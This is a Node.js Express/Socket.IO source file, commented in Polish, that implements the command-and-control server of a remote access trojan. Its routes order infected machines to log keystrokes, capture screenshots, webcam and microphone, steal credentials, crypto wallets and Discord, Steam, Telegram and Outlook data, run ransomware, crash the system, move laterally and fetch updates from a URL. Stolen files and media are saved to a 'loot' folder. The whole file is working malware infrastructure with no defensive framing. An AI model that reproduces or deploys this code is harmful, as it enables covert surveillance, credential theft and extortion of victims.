const express = require('express');
const cors = require('cors');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 5 * 1024 * 1024, cors: { origin: '*' } });

app.use(cors());
app.use(express.json({ limit: '50mb' }));

const LOOT = './loot';
if (!fs.existsSync(LOOT)) fs.mkdirSync(LOOT);

let clients = {};
let responses = {};
let keylogs = {};
let screenshots = {};
let credentials = {};
let processes = {};

app.get('/api/clients', (req, res) => {
    res.json(Object.values(clients).map(c => ({ id: c.id, ip: c.ip, hostname: c.hostname, user: c.user, os: c.os, online: c.online })));
});

app.get('/api/send_cmd', (req, res) => {
    const { clientId, cmd } = req.query;
    if (!clientId || !cmd) return res.status(400).send('Brak parametrow');
    io.to(clientId).emit('cmd', cmd);
    res.send('OK');
});

app.get('/api/responses/:clientId', (req, res) => {
    res.send((responses[req.params.clientId] || []).join('\n---\n') || 'Brak odpowiedzi.');
});

app.get('/api/keylogs/:clientId', (req, res) => {
    res.send((keylogs[req.params.clientId] || []).join('\n') || 'Brak keylogow.');
});

app.get('/api/screenshots/:clientId', (req, res) => {
    res.json(screenshots[req.params.clientId] || []);
});

app.get('/api/screenshot/:clientId/:filename', (req, res) => {
    const p = `${LOOT}/${req.params.clientId}/${req.params.filename}`;
    if (fs.existsSync(p)) res.sendFile(require('path').resolve(p));
    else res.status(404).send('Brak');
});

app.get('/api/credentials/:clientId', (req, res) => {
    res.json(credentials[req.params.clientId] || {});
});

app.get('/api/processes/:clientId', (req, res) => {
    res.json(processes[req.params.clientId] || []);
});

app.get('/api/files', (req, res) => {
    io.to(req.query.clientId).emit('list_files', req.query.path || 'C:\\');
    res.send('OK');
});

app.get('/api/download_file', (req, res) => {
    io.to(req.query.clientId).emit('download_file', req.query.path);
    res.send('OK');
});

app.get('/api/upload_file', (req, res) => {
    io.to(req.query.clientId).emit('upload_file', { url: req.query.localPath, dest: req.query.remotePath });
    res.send('OK');
});

app.get('/api/process_kill', (req, res) => {
    io.to(req.query.clientId).emit('kill_process', parseInt(req.query.pid));
    res.send('OK');
});

app.get('/api/process_start', (req, res) => {
    io.to(req.query.clientId).emit('start_process', req.query.path);
    res.send('OK');
});

app.get('/api/power', (req, res) => {
    io.to(req.query.clientId).emit('power', req.query.action);
    res.send('OK');
});

app.get('/api/bsod', (req, res) => {
    io.to(req.query.clientId).emit('bsod');
    res.send('OK');
});

app.get('/api/ransomware', (req, res) => {
    io.to(req.query.clientId).emit('ransomware', req.query.action);
    res.send('OK');
});

app.get('/api/steal_crypto', (req, res) => {
    io.to(req.query.clientId).emit('steal_crypto');
    res.send('OK');
});

app.get('/api/steal_discord', (req, res) => {
    io.to(req.query.clientId).emit('steal_discord');
    res.send('OK');
});

app.get('/api/steal_steam', (req, res) => {
    io.to(req.query.clientId).emit('steal_steam');
    res.send('OK');
});

app.get('/api/steal_telegram', (req, res) => {
    io.to(req.query.clientId).emit('steal_telegram');
    res.send('OK');
});

app.get('/api/steal_outlook', (req, res) => {
    io.to(req.query.clientId).emit('steal_outlook');
    res.send('OK');
});

app.get('/api/proxy_start', (req, res) => {
    io.to(req.query.clientId).emit('proxy_start');
    res.send('OK');
});

app.get('/api/proxy_stop', (req, res) => {
    io.to(req.query.clientId).emit('proxy_stop');
    res.send('OK');
});

app.get('/api/scan_network', (req, res) => {
    io.to(req.query.clientId).emit('scan_network');
    res.send('OK');
});

app.get('/api/lateral_move', (req, res) => {
    io.to(req.query.clientId).emit('lateral_move', { target: req.query.target, user: req.query.user, pass: req.query.pass });
    res.send('OK');
});

app.get('/api/cleanse', (req, res) => {
    io.to(req.query.clientId).emit('cleanse');
    res.send('OK');
});

app.get('/api/update', (req, res) => {
    io.to(req.query.clientId).emit('update', req.query.url);
    res.send('OK');
});

app.get('/api/selfdestruct', (req, res) => {
    io.to(req.query.clientId).emit('selfdestruct');
    res.send('OK');
});

app.get('/api/webcam_snap', (req, res) => {
    io.to(req.query.clientId).emit('webcam_snap');
    res.send('OK');
});

app.get('/api/mic_record', (req, res) => {
    io.to(req.query.clientId).emit('mic_record');
    res.send('OK');
});

io.on('connection', (socket) => {
    const clientId = socket.handshake.query.id || socket.id;
    const ip = socket.handshake.address;
    
    clients[clientId] = { id: clientId, ip: ip, socketId: socket.id, online: true, hostname: '', user: '', os: '' };
    responses[clientId] = responses[clientId] || [];
    keylogs[clientId] = keylogs[clientId] || [];
    screenshots[clientId] = screenshots[clientId] || [];
    
    socket.on('register', (data) => {
        clients[clientId].hostname = data.hostname;
        clients[clientId].user = data.user;
        clients[clientId].os = data.os;
    });

    socket.on('response', (data) => {
        responses[clientId].push(`[${new Date().toLocaleTimeString()}] ${data}`);
        if (responses[clientId].length > 100) responses[clientId].shift();
    });

    socket.on('keylog', (data) => {
        keylogs[clientId].push(data);
        if (keylogs[clientId].length > 200) keylogs[clientId].shift();
    });

    socket.on('screenshot', (data) => {
        const dir = `${LOOT}/${clientId}`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const fn = `screen_${Date.now()}.jpg`;
        fs.writeFileSync(`${dir}/${fn}`, Buffer.from(data, 'base64'));
        screenshots[clientId].push({ filename: fn, time: new Date().toISOString() });
    });

    socket.on('screen_frame', (data) => {
        io.emit(`screen_frame_${clientId}`, data);
    });

    socket.on('webcam_frame', (data) => {
        io.emit(`webcam_frame_${clientId}`, data);
    });

    socket.on('webcam_snap', (data) => {
        const dir = `${LOOT}/${clientId}`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(`${dir}/webcam_${Date.now()}.jpg`, Buffer.from(data, 'base64'));
    });

    socket.on('credentials', (data) => {
        credentials[clientId] = data;
    });

    socket.on('processes', (data) => {
        processes[clientId] = data;
    });

    socket.on('file_data', (data) => {
        const dir = `${LOOT}/${clientId}/downloads`;
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(`${dir}/${data.name}`, Buffer.from(data.data, 'base64'));
        responses[clientId].push(`[PLIK] Pobrano: ${data.name}`);
    });

    socket.on('mic_data', (data) => {
        const dir = `${LOOT}/${clientId}`;
        fs.writeFileSync(`${dir}/mic_${Date.now()}.wav`, Buffer.from(data, 'base64'));
    });

    socket.on('files', (data) => {
        io.emit(`files_${clientId}`, data);
    });

    socket.on('disconnect', () => {
        if (clients[clientId]) clients[clientId].online = false;
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log('Serwer na porcie ' + PORT));
